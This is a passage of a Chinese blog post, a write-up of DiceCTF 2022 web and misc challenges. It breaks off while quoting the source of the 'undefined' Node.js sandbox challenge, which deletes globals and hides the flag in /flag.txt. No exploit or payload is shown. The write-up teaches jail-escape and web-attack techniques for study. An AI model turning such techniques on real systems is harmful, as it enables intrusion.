<!DOCTYPE html>
<html class="has-navbar-fixed-top" lang="zh-tw">
<head>
    <meta charset="utf-8">
<title>我從 DiceCTF 2022 中學到的各種 JS 與前端冷知識 - Huli&#39;s blog</title>
<meta name="viewport" content="width=device-width, initial-scale=1">


<link href="https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/" rel="alternate" hreflang="zh-TW" />


<link href="https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/" rel="alternate" hreflang="x-default" />


            
<link href="https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/" rel="alternate" hreflang="en" />
            





    
<link rel="canonical" href="https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/">
    





    <meta name="description" content="如果你不知道什麼是 CTF，可以參考我之前寫過的：該如何入門 CTF 中的 Web 題？，裡面有簡單介紹一下什麼是 CTF，以及一些基本的題型。 去年的 DiceCTF 2021 我有認真玩了一下，最後解出 6 題 web 題，心得都在這邊：DiceCTF 2021 - Summary。今年的 DiceCTF 我有看了一下，直接被電爆，難度完全是不同等級。 這次的 Web 題一共有 10 題，1">
<meta property="og:type" content="article">
<meta property="og:title" content="我從 DiceCTF 2022 中學到的各種 JS 與前端冷知識">
<meta property="og:url" content="https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/index.html">
<meta property="og:site_name" content="Huli&#39;s blog">
<meta property="og:description" content="如果你不知道什麼是 CTF，可以參考我之前寫過的：該如何入門 CTF 中的 Web 題？，裡面有簡單介紹一下什麼是 CTF，以及一些基本的題型。 去年的 DiceCTF 2021 我有認真玩了一下，最後解出 6 題 web 題，心得都在這邊：DiceCTF 2021 - Summary。今年的 DiceCTF 我有看了一下，直接被電爆，難度完全是不同等級。 這次的 Web 題一共有 10 題，1">
<meta property="og:locale" content="zh_TW">
<meta property="og:image" content="https://blog.huli.tw/img/dicectf2022/p1.png">
<meta property="og:image" content="https://blog.huli.tw/img/dicectf2022/p2.png">
<meta property="og:image" content="https://blog.huli.tw/img/dicectf2022/p3.png">
<meta property="article:published_time" content="2022-02-08T11:58:50.000Z">
<meta property="article:modified_time" content="2023-05-07T01:15:16.492Z">
<meta property="article:author" content="Huli">
<meta property="article:tag" content="Security">
<meta property="article:tag" content="Front-end">
<meta property="article:tag" content="JavaScript">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://blog.huli.tw/img/dicectf2022/p1.png">



<link rel="alternative" href="/atom.xml" title="我從 DiceCTF 2022 中學到的各種 JS 與前端冷知識" type="application/atom+xml">



<link rel="icon" href="/img/lidemy_logo.png">


<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">


<link rel="stylesheet" href="/css/bulma.css?v=2.css">



<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />


<link rel="stylesheet" href="/css/style.css?v=4.css">





    
    
    
    
    
    
    
    
    
    
<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-1393J2EVCZ');
</script>


    


<meta name="generator" content="Hexo 6.3.0"></head>
<body>
    <script>
        if (localStorage.getItem('dark-mode')) {
            if (localStorage.getItem('dark-mode') === 'true') {
                document.body.classList.add('dark-mode')
            }
        } else {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                document.body.classList.add('dark-mode')
            }
        }
    </script>
    
<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
    <div class="container">
        <div class="navbar-brand">
            <a class="navbar-item navbar-logo" href="/">
                
                    
                    Huli&#39;s blog
                    
                
            </a>
            <div class="navbar-burger">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
        
        <div class="navbar-menu navbar-start">
            
            <a class="navbar-item "
               href="/archives">文章列表</a>
            
            <a class="navbar-item "
               href="/categories">分類</a>
            
            <a class="navbar-item "
               href="/recommend">推薦閱讀</a>
            
            <a class="navbar-item "
               href="/about">關於我</a>
            
        </div>
        
        <div class="navbar-menu navbar-end">
            
            
            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
                <a class="navbar-item" title="目錄">
                    目錄
                </a>
                <div class="navbar-dropdown">
                    
                    
                    
                    
                    <a class="navbar-item" href="#miscx2fundefined55-solves">1&nbsp;&nbsp;<b>misc/undefined(55 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#webx2fblazingfast75-solves">2&nbsp;&nbsp;<b>web/blazingfast(75 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#webx2fno-cookies5-solves">3&nbsp;&nbsp;<b>web/no-cookies(5 solves)</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#預期外解法">3.1&nbsp;&nbsp;預期外解法</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#webx2fvm-calc2-solves">4&nbsp;&nbsp;<b>web/vm-calc(2 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#webx2fnotekeeper2-solves">5&nbsp;&nbsp;<b>web/noteKeeper(2 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#webx2fdicevault2-solves">6&nbsp;&nbsp;<b>web/dicevault(2 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#webx2fcarrot1-solves">7&nbsp;&nbsp;<b>web/carrot(1 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#webx2fshadow0-solves">8&nbsp;&nbsp;<b>web/shadow(0 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#總結">9&nbsp;&nbsp;<b>總結</b></a>
                    
                </div>
            </div>
            
            
            <a class="navbar-item" target="_blank" title="Medium" href="https://hulitw.medium.com/">
                
                <i class="fab fa-medium"></i>
                
            </a>
               
            <a class="navbar-item" target="_blank" title="Facebook" href="https://www.facebook.com/huli.blog">
                
                <i class="fab fa-facebook"></i>
                
            </a>
               
            <a class="navbar-item" target="_blank" title="RSS" href="/atom-ch.xml">
                
                <i class="fas fa-rss"></i>
                
            </a>
               
            
            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
                <div>
                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
                    <defs>
                    </defs>
                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
                    </g>
                    </svg>
                </div>
            </a>
            
                <a class="navbar-item" href="/2022/02/08/en/what-i-learned-from-dicectf-2022/">English</a>
            
            

        </div>
    </div>
</nav>

    <section class="section">
    <div class="container">
      
      <div data-nosnippet class="self-notice">
        如果有什麼想回饋的（如對文章或部落格的感想），除了留言以外也能填表單跟我說：<a href="https://forms.gle/XuWyRC5qtSd2ANta8" target="_blank">表單連結</a>。若是對更多 JavaScript 知識有興趣，歡迎參考我的新書<a target="_blank" rel="noopener" href="https://www.tenlong.com.tw/products/9786267757048">《JavaScript 重修就好》</a>
      </div>
      
    <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            我從 DiceCTF 2022 中學到的各種 JS 與前端冷知識
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2022-02-08T11:58:50.000Z" itemprop="datePublished">2022年2月8日</time>
        </span>
        
        <span class="column is-narrow article-category">
            <i class="far fa-folder"></i>
            <a class="article-category-link" href="/categories/Security/">Security</a>
        </span>
        
        
        
    </div>
    
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <p>如果你不知道什麼是 CTF，可以參考我之前寫過的：<a target="_blank" rel="noopener" href="https://blog.techbridge.cc/2021/02/20/web-ctf-is-fun/">該如何入門 CTF 中的 Web 題？</a>，裡面有簡單介紹一下什麼是 CTF，以及一些基本的題型。</p>
<p>去年的 DiceCTF 2021 我有認真玩了一下，最後解出 6 題 web 題，心得都在這邊：<a target="_blank" rel="noopener" href="https://github.com/aszx87410/ctf-writeups/issues/20">DiceCTF 2021 - Summary</a>。今年的 DiceCTF 我有看了一下，直接被電爆，難度完全是不同等級。</p>
<p>這次的 Web 題一共有 10 題，1 題水題 365 隊解開，另一題比較簡單一點 75 隊解開，其他 8 題都只有 5 隊以內解開，其中還有一題沒人解開。</p>
<p>身為一個喜歡 web 以及 JS 相關冷知識的人，這是一個很好的學習機會，透過賽後放出的 <a target="_blank" rel="noopener" href="https://hackmd.io/fmdfFQ2iS6yoVpbR3KCiqQ">writeup</a> 來學習各種技巧。底下不會有所有 web 題的筆記，只會有我關注的題目。</p>
<span id="more"></span>

<h2><span id="miscx2fundefined55-solves">misc&#x2F;undefined(55 solves)</span></h2><p>這次在 misc 題型中也有一題跟 JS 相關的，題目敘述如下：</p>
<blockquote>
<p>I was writing some Javascript when everything became undefined…</p>
<p>Can you create something out of nothing and read the flag at &#x2F;flag.txt? Tested for Node version 17.</p>
</blockquote>
<p>原始碼長這樣：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token hashbang comment">#!/usr/local/bin/node</span>
<span class="token comment">// don't mind the ugly hack to read input</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"What do you want to run?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> inpBuf <span class="token operator">=</span> Buffer<span class="token punctuation">.</span><span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> input <span class="token operator">=</span> inpBuf<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"fs"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readSync</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> inpBuf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
inpBuf <span class="token operator">=</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>

<span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor <span class="token operator">=</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>
<span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor <span class="token operator">=</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>
<span class="token punctuation">(</span><span class="token keyword">function</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor <span class="token operator">=</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>
<span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token keyword">function</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor <span class="token operator">=</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> key <span class="token keyword">of</span> Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>global<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"global"</span><span class="token punctuation">,</span> <span class="token string">"console"</span><span class="token punctuation">,</span> <span class="token string">"eval"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">continue</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    global<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">delete</span> global<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">delete</span> global<span class="token punctuation">.</span>global<span class="token punctuation">;</span>
process <span class="token operator">=</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>

<span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> AbortController<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> AbortSignal<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> AggregateError<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> Array<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> ArrayBuffer<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> Atomics<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> BigInt<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> BigInt64Array<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> BigUint64Array<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> Boolean<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> Buffer<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> DOMException<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> DataView<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> Date<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> Error<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> EvalError<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> Event<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> EventTarget<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> FinalizationRegistry<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> Float32Array<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> Float64Array<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> Function<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> <span class="token number">Infinity</span><span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> Int16Array<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> Int32Array<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> __dirname<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> Int8Array<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> Intl<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> <span class="token constant">JSON</span><span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> Map<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> Math<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> MessageChannel<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> MessageEvent<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> MessagePort<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> <span class="token number">NaN</span><span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> Number<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> Object<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> Promise<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> Proxy<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> RangeError<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> ReferenceError<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> Reflect<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> RegExp<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> Set<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> SharedArrayBuffer<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> String<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> Symbol<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> SyntaxError<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> TextDecoder<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> TextEncoder<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> TypeError<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> URIError<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> <span class="token constant">URL</span><span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> URLSearchParams<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> Uint16Array<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> Uint32Array<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> Uint8Array<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> Uint8ClampedArray<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> WeakMap<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> WeakRef<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> WeakSet<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> WebAssembly<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> _<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> exports<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> _error<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> assert<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> async_hooks<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> atob<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> btoa<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> buffer<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> child_process<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> clearImmediate<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> clearInterval<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> clearTimeout<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> cluster<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> constants<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> crypto<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> decodeURI<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> decodeURIComponent<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> dgram<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> diagnostics_channel<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> dns<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> domain<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> encodeURI<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> encodeURIComponent<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> arguments<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> escape<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> events<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> fs<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> global<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> globalThis<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> http<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> http2<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> https<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> inspector<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> isFinite<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> isNaN<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> module<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> net<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> os<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> parseFloat<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> parseInt<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> path<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> perf_hooks<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> performance<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> process<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> punycode<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> querystring<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> queueMicrotask<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> readline<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> repl<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> require<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> setImmediate<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> setInterval<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> __filename<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> setTimeout<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> stream<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> string_decoder<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> structuredClone<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> sys<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> timers<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> tls<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> trace_events<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> tty<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> unescape<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> url<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> util<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> v8<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> vm<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> wasi<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> worker_threads<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> zlib<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
